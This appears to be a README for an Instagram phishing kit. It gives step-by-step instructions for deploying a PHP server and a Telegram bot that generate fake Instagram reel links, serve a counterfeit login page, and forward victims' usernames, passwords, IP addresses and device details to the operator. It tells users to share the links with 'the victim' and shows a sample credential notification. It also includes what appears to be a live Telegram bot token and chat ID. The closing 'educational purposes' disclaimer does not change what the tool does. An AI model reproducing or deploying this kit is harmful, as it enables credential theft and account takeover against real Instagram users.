<h1 align='center'>π</h1>

<h2 align='center'>Instagram Phishing Tool with Telegram Bot</h2>

## How to use

### Step 1: Deploy to Railway

#### Option A: Deploy via Railway Dashboard

1. Create account at [railway.app](https://railway.app)
2. Click **"New Project"** → **"Deploy from GitHub repo"**
3. Connect your GitHub account and select this repository
4. Railway will auto-detect PHP and deploy
5. Go to **Variables** tab and add:
   ```
   TELEGRAM_BOT_TOKEN=8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA
   TELEGRAM_CHAT_ID=8244999766
   BASE_URL=https://your-app.railway.app
   ```
6. Copy your Railway app URL (e.g., `https://your-app.railway.app`)

#### Option B: Deploy via Railway CLI

1. Install Railway CLI:
   ```bash
   npm install -g @railway/cli
   ```
2. Login to Railway:
   ```bash
   railway login
   ```
3. Initialize project:
   ```bash
   cd "PI-main"
   railway init
   ```
4. Set environment variables:
   ```bash
   railway variables set TELEGRAM_BOT_TOKEN=8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA
   railway variables set TELEGRAM_CHAT_ID=8244999766
   railway variables set BASE_URL=https://your-app.railway.app
   ```
5. Deploy:
   ```bash
   railway up
   ```
6. Get your URL:
   ```bash
   railway domain
   ```

#### Option C: Manual Hosting

1. Host the "Web Server Files" folder on any PHP hosting platform
2. Create a `.env` file with:
   ```
   TELEGRAM_BOT_TOKEN=8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA
   TELEGRAM_CHAT_ID=8244999766
   BASE_URL=https://your-app.railway.app
   ```
3. Make sure your hosting supports PHP 7.4+ and cURL

### Step 2: Setup Telegram Bot Webhook

After deploying, visit this URL in your browser:

```
https://your-app.railway.app/setup_webhook.php
```

This will connect the Telegram bot to your server.

### Step 3: Start Using the Bot

1. Open Telegram
2. Search for your bot (the one with token `8287031383:...`)
3. Send `/start` to the bot
4. **Send any video link** (Instagram, YouTube, etc.)
5. **Bot will generate a phishing link for you!**

### Bot Commands

| Command      | Description                           |
| ------------ | ------------------------------------- |
| `/start`     | Welcome message and instructions      |
| `/generate`  | Generate a random phishing link       |
| `/stats`     | View capture statistics               |
| `/help`      | Show help guide                       |
| `<any text>` | Generate phishing link based on input |

### How It Works

1. **You send a video link to the bot** (e.g., `https://instagram.com/reel/xyz`)
2. **Bot generates a phishing link** (e.g., `https://your-app.railway.app/reel/CxK4RN2J8mP`)
3. **You share this link with the victim**
4. **Victim clicks → sees fake Instagram login**
5. **Victim enters credentials**
6. **You receive credentials on Telegram instantly!**

### Example Usage

```
You: https://instagram.com/reel/CxK4RN2J8mP
Bot: ✅ Phishing Link Generated!
     🔗 Your link:
     https://your-app.railway.app/reel/AbC123XyZ

     📱 Share this link with your target
```

### Credential Notification

When someone enters their credentials, you'll receive:

```
🔔 New Instagram Login Attempt

👤 Username: victim_username
🔑 Password: their_password

📍 IP Address: xxx.xxx.xxx.xxx
🕐 Time: 2024-01-15 14:30:22
📱 Device: Mozilla/5.0 (iPhone...)
```

## Environment Variables

| Variable             | Description                 | Required |
| -------------------- | --------------------------- | -------- |
| `TELEGRAM_BOT_TOKEN` | Your Telegram bot token     | Yes      |
| `TELEGRAM_CHAT_ID`   | Your Telegram user ID       | Yes      |
| `BASE_URL`           | Your Railway deployment URL | Yes      |
| `LOG_FILE`           | Backup log filename         | No       |

## DISCLAIMER

<p align="center">
  TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>

**This tool is for educational and authorized penetration testing purposes only.**

- Unauthorized access to computer systems is illegal
- Phishing attacks are illegal in most jurisdictions
- Misuse can result in severe legal consequences

**USE AT YOUR OWN RISK - FOR EDUCATIONAL PURPOSES ONLY**
